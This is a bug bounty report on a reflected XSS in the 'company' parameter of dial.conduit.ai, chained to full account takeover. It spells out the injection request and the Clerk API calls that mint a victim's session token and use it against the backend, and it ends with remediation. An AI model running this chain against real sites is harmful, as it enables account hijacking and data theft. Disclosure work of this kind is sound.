# Account Takeover via Reflected XSS on `dial.conduit.ai` → cross-subdomain Clerk session-token minting

| | |
|---|---|
| **Program** | Conduit Security Vulnerability Disclosure & Bug Bounty Policy (Xposera) |
| **Entry point** | `https://dial.conduit.ai/` (`company` parameter) — in scope (`https://*.conduit.ai/`) |
| **Vulnerability class** | Reflected XSS (CWE-79) chained to Account Takeover (CWE-384 / CWE-942) |
| **Intrinsic severity** | **Critical** — CVSS 3.1 **9.0** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` |
| **Program-capped severity** | **High** (this asset's max severity is High) |
| **Authentication** | None (attacker); victim need only open one link |
| **Reporter / Date** | Gowthambalaji S (gowtham@auditifysecurity.com) / 2026-10-09 |

---

## 1. Summary

`dial.conduit.ai` reflects the `company` query parameter into its HTML with **no output encoding
and no Content-Security-Policy**, giving an unauthenticated attacker arbitrary JavaScript execution
in the `dial.conduit.ai` origin.

Because Conduit authenticates with **Clerk**, and Clerk's Frontend API (`clerk.conduit.ai`) **allows
credentialed cross-origin requests from `conduit.ai` subdomains**, JavaScript running in the
`dial.conduit.ai` origin can read the victim's active Clerk session and **mint a fresh Convex-audience
session token** for that victim. That token grants full authenticated access to the victim's Conduit
account and workspace through the backend API (`api.conduit.ai` / Convex).

**Net result:** one click on an attacker link = complete takeover of the victim's Conduit account.
The session cookie being `HttpOnly` does **not** prevent this, because the attacker's script mints a
brand-new token rather than reading the cookie.

## 2. Reflected XSS (the injection point)

Unauthenticated request with HTML metacharacters in `company`, and the verbatim response — `<b>`,
`"`, `'`, `=` all returned **unencoded**:

```
GET /?company=ZZmark7<b>"'=</b> HTTP/2
Host: dial.conduit.ai
```
```html
<div class="error-message">
    No report found for company: <strong>ZZmark7<b>"'=</b></strong>
</div>
```
Response is `Content-Type: text/html` with **no `Content-Security-Policy`** and no
`X-Content-Type-Options`. `<script>…</script>` is reflected intact.

**Proof of execution** (banner painted by injected JS reading `document.domain` + `document.cookie`):
see `evidence/dial_xss_banner_proof.jpg` — red banner
`XSS EXECUTED — origin: dial.conduit.ai — cookies readable: 1007 bytes`.

## 3. Escalation to Account Takeover

The following runs inside the `dial.conduit.ai` origin (delivered by the XSS payload). All steps use
the victim's ambient, same-site `.conduit.ai` cookies (`credentials: 'include'`).

**Step A — read the victim's Clerk session (CORS-permitted cross-origin):**
```
GET https://clerk.conduit.ai/v1/client?__clerk_api_version=2025-11-10&_clerk_js_version=5.0.0
    (credentials: include)   →  HTTP 200, response body readable, active session id obtained
```

**Step B — mint a Convex-audience session token for the victim:**
```
POST https://clerk.conduit.ai/v1/client/sessions/{sessionId}/tokens/convex?__clerk_api_version=2025-11-10&_clerk_js_version=5.0.0
     (credentials: include)  →  HTTP 200, { "jwt": "<valid session JWT, >100 chars>" }
```

**Step C — use the minted token against Conduit's backend as the victim:**
```
POST https://knowing-emu-505.convex.cloud/api/query     (= api.conduit.ai backend)
Authorization: Bearer <minted jwt>
{ "path": "users/workspacePreferences:resolveLandingWorkspace", "args": {}, "format": "json" }
     →  HTTP 200, { "status": "success", ... }   (authenticated victim data)
```

**Step D — exfiltrate / act.** The attacker's script sends the minted JWT to an attacker-controlled
endpoint (webhook), or simply drives authenticated API calls directly from the victim's browser:
read all contacts / conversations / tickets / calls, send messages as the victim, change account and
workspace settings, create API tokens, etc.

### Observed results (reproduced 2×, on the reporter's own account)

```
origin        = https://dial.conduit.ai
readSession   = true          (Step A: HTTP 200, session parsed)
mintConvex    = 200           (Step B: token minted)
jwtValid      = true          (JWT length > 100)
apiCall       = 200           (Step C: backend accepted the token)
apiAuthed     = YES           (backend returned authenticated victim data)
```

## 4. Root cause

1. **Reflected XSS** — `dial.conduit.ai` inserts `company` into HTML without encoding; no CSP.
2. **Over-permissive cross-origin auth** — Clerk's Frontend API accepts credentialed requests from
   `dial.conduit.ai` (a non-login subdomain) and lets it mint session tokens. Combined with
   `.conduit.ai`-scoped, same-site session cookies, this lets **any** XSS on **any** `*.conduit.ai`
   subdomain mint a victim's token and take over the account.

The `HttpOnly` flag on `__session` provides no protection here: the attack mints a new token via the
authenticated session rather than reading the cookie.

## 5. Impact

Full account takeover of any Conduit user who opens an attacker-supplied `dial.conduit.ai` link:

- Read all of the victim's workspace data (contacts, conversations, tickets, calls, knowledge base).
- Act as the victim (send messages, change settings, create API tokens, invite/remove members).
- Persist access by minting long-lived API tokens from the victim's session.

**CVSS 3.1:** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` = **9.0 (Critical)**.
Reported at **High** per this asset's program-defined maximum severity.

## 6. Remediation

1. **Fix the XSS** — HTML-entity-encode `company` (or render with `textContent`); add a strict CSP
   (`default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'`) and
   `X-Content-Type-Options: nosniff` on `dial.conduit.ai`.
2. **Restrict Clerk allowed origins** — remove non-application subdomains (e.g. `dial.conduit.ai`)
   from the Clerk instance's allowed origins so arbitrary `*.conduit.ai` origins cannot mint session
   tokens. Treat every `conduit.ai` subdomain as a potential token-minting origin until it does.
3. Audit all `*.conduit.ai` subdomains for XSS/HTML-injection, since any one of them is now an ATO
   vector while (2) stands.

## 7. Evidence (attached)

| File | Description |
|---|---|
| `evidence/dial_xss_banner_proof.jpg` | XSS execution proof (banner written by injected JS). |
| `evidence/dial_xss_execution.gif` | Screen recording of XSS execution. |
| `evidence/dial_reflection_context.html` | Server response showing unencoded reflection. |
| `evidence/dial_response_headers.txt` | Headers: no CSP / no nosniff. |
| `evidence/ato_chain_results.txt` | Step A–C result flags (readSession/mintConvex/jwtValid/apiCall/apiAuthed). |

All testing used the reporter's own account; no other tenant's data was accessed. Minted tokens were
short-lived and no account state was modified.
